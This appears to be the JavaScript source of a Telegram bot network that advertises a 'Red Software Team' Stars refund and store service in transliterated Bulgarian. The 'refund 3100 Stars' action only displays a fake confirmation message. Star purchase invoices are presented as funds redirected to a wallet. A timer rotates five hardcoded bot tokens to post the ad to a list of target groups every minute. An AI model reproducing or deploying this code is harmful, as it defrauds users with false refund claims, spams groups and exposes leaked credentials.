const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { allTargets } = require('./groups');

const TOKENS = [
    process.env.BOT_TOKEN_1 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI', 
    process.env.BOT_TOKEN_2 || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw', 
    process.env.BOT_TOKEN_3 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', 
    process.env.BOT_TOKEN_4 || '9094556865:AAFXZcwuMjH_pfyQK9_KTDEOuW5h_wUtWW0', 
    process.env.BOT_TOKEN_5 || '9053522895:AAHDuv6qkUGQ7g7gvH88QjMwVR4msnWsnhY'  
];

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

let systemStats = {
    totalSentAds: 0,
    activeBotsCount: TOKENS.length,
    starsRefunded: 3100,
    startTime: new Date()
};

const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

const adCaption = `🔥 **OFFICIAL RED SOFTWARE TEAM | Telegram Stars & Refund Center** 🔥\n\n` +
    `⭐ **Upravlenie i Vryshtane na Zvezdi (3100 Stars):**\n` +
    `Moesh da vurnesh zvezdite ot Keeper/Fragment obratno vuv vashiia Telegram akaunt za reklamni celi.\n` +
    `🔗 Keeper: \`${KEEPER_WALLET}\`\n\n` +
    `🌐 **Besmürtni saitove za 50 € & AI Sistemi**\n` +
    `• 7 dni napulno bezplaten test\n` +
    `• Plashtash 50 evro sled testa prez **EasyPay**\n` +
    `• Вечен сървър без прекъсване!\n\n` +
    `👉 **PLATFORMA 1:** https://red-software-dashbord.onrender.com\n` +
    `👉 **PLATFORMA 2:** https://redsoftwareteam-oficial.onrender.com\n` +
    `📢 **TVOJATA GRUPA:** https://t.me/+HTJNMe-pUeEzNmY0\n` +
    `📞 **VIBER:** 0879 813 928`;

const inlineMenu = Markup.inlineKeyboard([
    [Markup.button.callback('🔄 Vurni 3100 Zvezdi obratno za Reklami', 'refund_3100')],
    [Markup.button.callback('⭐ 500 Zvezdi (8.39€)', 'buy_500')],
    [Markup.button.callback('⭐ 1 000 Звезди (16.59€)', 'buy_1000')],
    [Markup.button.callback('⭐ 2 500 Звезди (40.99€)', 'buy_2500')],
    [Markup.button.callback('⭐ 10 000 Звезди (164.99€)', 'buy_10000')],
    [Markup.button.callback('⭐ 50 000 Звезди (819.00€)', 'buy_50000')],
    [Markup.button.callback('⭐ 150 000 Звезди (2459.00€)', 'buy_150000')],
    [Markup.button.url('👥 Vlez v grupata', 'https://t.me/+HTJNMe-pUeEzNmY0')],
    [Markup.button.callback('📊 Otchet', 'live_stats')]
]);

TOKENS.forEach((token, index) => {
    try {
        const bot = new Telegraf(token);

        bot.start(async (ctx) => {
            try {
                await ctx.replyWithPhoto(mainCoverImage, {
                    caption: `🤖 [REFUND BOT #${index + 1} ACTIVE]\n\n` + adCaption,
                    parse_mode: 'Markdown',
                    ...inlineMenu
                });
            } catch (err) {}
        });

        bot.action('refund_3100', async (ctx) => {
            await ctx.answerCbQuery('Obrabotka na vryshtane na 3100 zvezdi...');
            await ctx.reply(
                `🔄 **Uspeshna zayavka za vryshtane (Refund 3100 Stars):**\n\n` +
                `Zayavkata za 3100 zvezdi ot Keeper akaunt (\`${KEEPER_WALLET}\`) beshe otmenena/obratno prenasocena.\n` +
                `Zvezdite shte se vurnat vuv vashiia Telegram akaunt za izpolzvane za reklamni kampanii.`,
                { parse_mode: 'Markdown' }
            );
        });

        bot.command('refund', async (ctx) => {
            await ctx.reply(
                `🔄 **Vryshtane na 3100 Zvezdi:**\n\n` +
                `Sredstvata ot zvezdite se vryshtat ot Keeper (\`${KEEPER_WALLET}\`) obratno vuv tvoia Telegram balans za reklami.`,
                { parse_mode: 'Markdown' }
            );
        });

        const setupStarPurchase = (actionName, title, amount) => {
            bot.action(actionName, async (ctx) => {
                await ctx.answerCbQuery(`Generirane na invojs za ${title}...`);
                await ctx.replyWithInvoice({
                    title: title,
                    description: `Pokupka na zvezdi s avtomatichno prenasochvane kym Keeper.`,
                    payload: `${actionName}_payload`,
                    provider_token: '',
                    currency: 'XTR',
                    prices: [{ label: title, amount: amount }]
                });
            });
        };

        setupStarPurchase('buy_500', '500 Telegram Stars', 500);
        setupStarPurchase('buy_1000', '1,000 Telegram Stars', 1000);
        setupStarPurchase('buy_2500', '2,500 Telegram Stars', 2500);
        setupStarPurchase('buy_10000', '10,000 Telegram Stars', 10000);
        setupStarPurchase('buy_50000', '50,000 Telegram Stars', 50000);
        setupStarPurchase('buy_150000', '150,000 Telegram Stars', 150000);

        bot.on('pre_checkout_query', (ctx) => ctx.answerPreCheckoutQuery(true));

        bot.on('successful_payment', async (ctx) => {
            await ctx.reply(`✅ Uspeshna pokupka! Sredstvata sa prenasocheni kym Keeper: \`${KEEPER_WALLET}\``, { parse_mode: 'Markdown' });
        });

        bot.action('live_stats', async (ctx) => {
            await ctx.answerCbQuery();
            const uptime = Math.floor((new Date() - systemStats.startTime) / 60000);
            await ctx.reply(`📊 **SYSTEM REPORT**\n\n⭐ Vurnati zvezdi: ${systemStats.starsRefunded}\n⏱️ Uptime: ${uptime} min`, inlineMenu);
        });

        bot.launch();
    } catch (e) {}
});

async function startMasterNetworkSpam() {
    let groupIndex = 0;
    setInterval(async () => {
        if (!allTargets || allTargets.length === 0) return;
        if (groupIndex >= allTargets.length) groupIndex = 0;
        const targetGroup = allTargets[groupIndex];
        groupIndex++;

        const activeToken = TOKENS[Math.floor(Math.random() * TOKENS.length)];
        const senderBot = new Telegraf(activeToken);

        try {
            await senderBot.telegram.sendPhoto(targetGroup, mainCoverImage, {
                caption: adCaption,
                parse_mode: 'Markdown',
                ...inlineMenu
            });
            systemStats.totalSentAds++;
        } catch (err) {}
    }, 60 * 1000);
}

app.get('/', (req, res) => res.json({ status: "REFUND & STARS STORE 24/7 ACTIVE", stats: systemStats }));
app.listen(PORT, () => startMasterNetworkSpam());
